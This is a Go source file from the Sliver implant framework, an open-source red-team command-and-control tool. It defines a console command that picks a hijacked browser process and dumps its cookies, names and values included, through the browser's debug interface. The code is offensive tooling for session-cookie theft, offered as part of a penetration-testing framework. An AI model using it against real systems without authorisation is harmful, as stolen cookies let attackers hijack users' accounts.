package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/desertbit/grumble"
)

func CursedCookiesCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	curse := selectCursedProcess(con)
	if curse == nil {
		return
	}
	con.Println()

	cookies, err := overlord.DumpCookies(curse, curse.DebugURL().String())
	if err != nil {
		con.PrintErrorf("Failed to dump cookies: %s\n", err)
		return
	}

	con.PrintInfof("Domain\tName\tValue")
	for _, cookie := range cookies {
		con.Printf("%s\t%s\t%s", cookie.Domain, cookie.Name, cookie.Value)
	}
}
